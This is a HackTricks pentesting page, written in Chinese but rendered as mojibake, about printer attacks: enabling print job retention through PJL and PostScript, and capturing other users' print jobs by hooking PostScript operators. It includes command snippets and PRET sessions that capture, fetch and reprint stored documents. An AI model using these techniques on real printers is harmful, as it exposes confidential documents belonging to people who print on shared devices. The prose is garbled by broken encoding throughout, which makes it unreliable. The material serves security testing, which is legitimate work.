<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# ä½œä¸šä¿ç•™

æŸäº›æ‰“å°æœºå¯ä»¥ä»WebæœåŠ¡å™¨è®¿é—®å­˜å‚¨çš„æ‰“å°ä½œä¸šã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå¿…é¡»æ˜¾å¼æ¿€æ´»ä½œä¸šä¿ç•™åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨æ ‡å‡†çš„PJLå‘½ä»¤æˆ–ä¸“æœ‰çš„PostScriptä»£ç æ¥å®Œæˆã€‚ä½œä¸šå°†ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œå¹¶å¯ä»¥ä»æ§åˆ¶é¢æ¿é‡æ–°æ‰“å°ã€‚

## PJL

å¯ä»¥é€šè¿‡è®¾ç½®PJL HOLDå˜é‡æ¥ä¸ºå½“å‰æ–‡æ¡£å¯ç”¨åˆæ³•çš„ä½œä¸šä¿ç•™ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```
@PJL SET HOLD=ON
[actual data to be printed follows]
```
æ‰“å°ä½œä¸šä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œå¹¶å¯ä»¥ä»æ‰“å°æœºçš„æ§åˆ¶é¢æ¿é‡æ–°æ‰“å°ã€‚è¿™ä¸ªåŠŸèƒ½è¢«è®¸å¤šæ‰“å°æœºæ”¯æŒï¼Œç„¶è€Œä¼¼ä¹åªæœ‰ä¸€äº›çˆ±æ™®ç”Ÿè®¾å¤‡å…è®¸ä½¿ç”¨`@PJL DEFAULT HOLD=ON`è®¾ç½®æ°¸ä¹…ä½œä¸šä¿ç•™ã€‚

**å¦‚ä½•æµ‹è¯•è¿™ç§æ”»å‡»ï¼Ÿ**

ä½¿ç”¨[**PRET** ](https://github.com/RUB-NDS/PRET)ä¸­çš„`hold`å‘½ä»¤ï¼Œåœ¨pjlæ¨¡å¼ä¸‹æ£€æŸ¥æ˜¯å¦å¯ä»¥è®¾ç½®æ°¸ä¹…ä½œä¸šä¿ç•™ï¼š
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Setting job retention, reconnecting to see if still enabled
Retention for future print jobs: OFF
```
## PostScript

PostScriptæä¾›ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†æ˜¯å®ƒæ˜¯åŸºäºå‹å·å’Œä¾›åº”å•†çš„ã€‚å¯¹äºHP LaserJet 4kç³»åˆ—å’Œå„ç§Kyoceraæ‰“å°æœºï¼Œå¯ä»¥é€šè¿‡åœ¨PostScriptæ–‡æ¡£å‰æ·»åŠ ä»¥ä¸‹å‘½ä»¤æ¥å¯ç”¨ä½œä¸šä¿ç•™åŠŸèƒ½ï¼š
```
<< /Collate true /CollateDetails
<< /Hold 1 /Type 8 >> >> setpagedevice
```
è™½ç„¶åœ¨ç†è®ºä¸Šå¯ä»¥ä½¿ç”¨[startjob](./#postscript-ps)æ“ä½œç¬¦æ°¸ä¹…å¯ç”¨PostScriptä½œä¸šä¿ç•™ï¼Œä½†æ˜¯CUPSåœ¨æ¯ä¸ªæ‰“å°ä½œä¸šå¼€å§‹æ—¶éƒ½ä¼šä½¿ç”¨`<< /Collate false >> setpagedevice`æ˜¾å¼é‡ç½®æ­¤è®¾ç½®ã€‚ç„¶è€Œï¼Œä¸ºäº†å¯¹æŠ—è¿™ç§ä¿æŠ¤æœºåˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥æ°¸ä¹…é‡æ–°å®šä¹‰`setpagedevice`æ“ä½œç¬¦ï¼Œä½¿å…¶å®Œå…¨æ— æ•ˆã€‚

**å¦‚ä½•æµ‹è¯•æ­¤æ”»å‡»ï¼Ÿ**

åœ¨psæ¨¡å¼ä¸‹ä½¿ç”¨[**PRET**](https://github.com/RUB-NDS/PRET)ä¸­çš„`hold`å‘½ä»¤ï¼š
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Job retention enabled.
```
# ä»»åŠ¡æ•è·

å¦‚ä¸Šæ‰€è¿°ï¼Œé€šè¿‡æ‰“å¼€æ‰“å°å¯¹è¯æ¡†ï¼Œæ¿€æ´»ä½œä¸šä¿ç•™æ˜¯å¯èƒ½çš„ï¼Œä½†ä¸å¸¸è§ã€‚ç„¶è€Œï¼Œä½¿ç”¨PostScriptï¼Œå¯ä»¥å®Œå…¨è®¿é—®å½“å‰çš„æ‰“å°ä½œä¸šï¼Œå¹¶ä¸”ä½¿ç”¨[startjob](./#postscript-ps)è¿ç®—ç¬¦ï¼Œç”šè‡³å¯ä»¥æ‰“ç ´æœåŠ¡å™¨å¾ªç¯å¹¶è®¿é—®æœªæ¥çš„ä½œä¸šã€‚å¦‚æœä½¿ç”¨PostScriptä½œä¸ºæ‰“å°æœºé©±åŠ¨ç¨‹åºï¼Œè¿™ç§åŠŸèƒ½æœ‰å¯èƒ½æ•è·æ‰€æœ‰æ–‡æ¡£ã€‚

## PostScript

é€šè¿‡èƒ½å¤Ÿé’©å…¥ä»»æ„çš„PostScriptè¿ç®—ç¬¦ï¼Œå¯ä»¥æ“çºµå’Œè®¿é—®å¤–éƒ¨çš„æ‰“å°ä½œä¸šã€‚ä¸ºäº†**è§£æå‘é€åˆ°æ‰“å°æœºçš„å®é™…æ•°æ®æµ**ï¼Œå¯ä»¥åº”ç”¨PostScriptè¯­è¨€çš„ä¸€ä¸ªå¾ˆé…·çš„ç‰¹æ€§ï¼šä½¿ç”¨`currentfile`è¿ç®—ç¬¦å°†è‡ªå·±çš„ç¨‹åºä»£ç ä½œä¸ºæ•°æ®è¯»å–ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥é€šè¿‡è¯»å–å¹¶å°†è¦ç”±PostScriptè§£é‡Šå™¨å¤„ç†çš„æ•´ä¸ªæ•°æ®æµå­˜å‚¨åˆ°æ‰“å°æœºè®¾å¤‡ä¸Šçš„æ–‡ä»¶ä¸­æ¥è®¿é—®æ•´ä¸ªæ•°æ®æµã€‚å¦‚æœæ‰“å°æœºä¸æä¾›æ–‡ä»¶ç³»ç»Ÿè®¿é—®æƒé™ï¼Œ**æ•è·çš„æ–‡æ¡£å¯ä»¥å­˜å‚¨åœ¨å†…å­˜ä¸­**ï¼Œä¾‹å¦‚åœ¨æ°¸ä¹…çš„PostScriptå­—å…¸ä¸­ã€‚\
ä¸€ä¸ªå®é™…çš„é—®é¢˜æ˜¯å†³å®š**åº”è¯¥é’©å…¥å“ªä¸ªè¿ç®—ç¬¦**ï¼Œå› ä¸ºåœ¨PostScriptè§£é‡Šå™¨å¤„ç†æ­¤è¿ç®—ç¬¦ä¹‹å‰ï¼Œæ— æ³•è®¿é—®æ•°æ®æµã€‚ç”±äºæ”»å‡»è€…å¸Œæœ›ä»ä¸€å¼€å§‹å°±æ•è·æ‰“å°ä½œä¸šï¼Œæ‰€ä»¥**é‡æ–°å®šä¹‰çš„è¿ç®—ç¬¦å¿…é¡»æ˜¯åŒ…å«åœ¨PostScriptæ–‡æ¡£ä¸­çš„ç¬¬ä¸€ä¸ªè¿ç®—ç¬¦**ã€‚å¹¸è¿çš„æ˜¯ï¼Œä½¿ç”¨CUPSæ‰“å°çš„æ‰€æœ‰æ–‡æ¡£éƒ½è¢«å‹ç¼©æˆä¸€ä¸ªå›ºå®šçš„ç»“æ„ï¼Œä»¥`currentfile /ASCII85Decode filter /LZWDecode filter cvx exec`å¼€å¤´ã€‚åŸºäºè¿™ç§å›ºå®šç»“æ„çš„å‡è®¾ï¼Œæ”»å‡»è€…å¯ä»¥ä»ä¸€å¼€å§‹å°±æ•è·æ–‡æ¡£ï¼Œå¹¶åœ¨ä¹‹åæ‰§è¡Œï¼ˆå³æ‰“å°ï¼‰è¯¥æ–‡ä»¶ã€‚å¯¹äº**ä¸æ˜¯CUPSçš„æ‰“å°ç³»ç»Ÿ**ï¼Œè¿™ç§æ”»å‡»ä¹Ÿåº”è¯¥æ˜¯å¯èƒ½çš„ï¼Œä½†**éœ€è¦è°ƒæ•´è¿ç®—ç¬¦**ã€‚è¯·æ³¨æ„ï¼Œé€šå¸¸åŒ…æ‹¬ä»‹è´¨å¤§å°ã€ç”¨æˆ·å’Œä½œä¸šåç§°çš„PostScriptå¤´éƒ¨æ— æ³•ä½¿ç”¨æ­¤æ–¹æ³•æ•è·ï¼Œå› ä¸ºæˆ‘ä»¬é¦–å…ˆåœ¨å®é™…æ–‡æ¡£çš„å¼€å¤´è¿›è¡Œé’©å…¥ã€‚å¦ä¸€ç§åœ¨æ¯ä¸ªæ‰“å°ä½œä¸šå¼€å§‹æ—¶è¿›è¡Œé’©å…¥çš„é€šç”¨ç­–ç•¥æ˜¯è®¾ç½®`BeginPage`ç³»ç»Ÿå‚æ•°ï¼ˆå¦‚æœæ‰“å°æœºæ”¯æŒçš„è¯ï¼Œå¤§å¤šæ•°æ‰“å°æœºéƒ½æ”¯æŒï¼‰ã€‚è¿™ç§æ¼æ´å¯èƒ½å·²ç»å­˜åœ¨äºæ‰“å°è®¾å¤‡ä¸­å‡ åå¹´äº†ï¼Œå› ä¸ºå®ƒä»…æ»¥ç”¨äº†PostScriptæ ‡å‡†å®šä¹‰çš„è¯­è¨€ç»“æ„ã€‚

åœ¨psæ¨¡å¼ä¸‹ä½¿ç”¨[**PRET**](https://github.com/RUB-NDS/PRET)ä¸­çš„`capture`å‘½ä»¤ï¼š
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.

printer:/> capture
Print job operations:  capture <operation>
capture start   - Record future print jobs.
capture stop    - End capturing print jobs.
capture list    - Show captured print jobs.
capture fetch   - Save captured print jobs.
capture print   - Reprint saved print jobs.
printer:/> capture start
Future print jobs will be captured in memory!
printer:/> exit
```
ç°åœ¨ï¼Œæ‰“å°ä»»æ„æ–‡æ¡£ï¼ˆç¡®ä¿PRETæœªè¿æ¥ï¼Œä»¥å…é˜»å¡æ‰“å°é€šé“ï¼‰ã€‚ä¹‹åï¼Œæ‚¨å¯ä»¥åˆ—å‡ºã€è·å–æˆ–é‡æ–°æ‰“å°å·²æ•è·çš„æ–‡æ¡£ï¼š
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> capture list
Free virtual memory: 16.6M | Limit to capture:  5.0M
date          size  user           jobname                 creator
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Jan 25 18:38  3.1M  -              -                       -
Jan 25 18:40  170K  -              -                       -
printer:/> capture fetch
Receiving capture/printer/690782792
3239748 bytes received.
Receiving capture/printer/690646210
174037 bytes received.
printer:/> capture print
printing...
printing...
2 jobs reprinted
printer:/> capture stop
Stopping job capture, deleting recorded jobs
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ NFT æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**æ¨ç‰¹**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
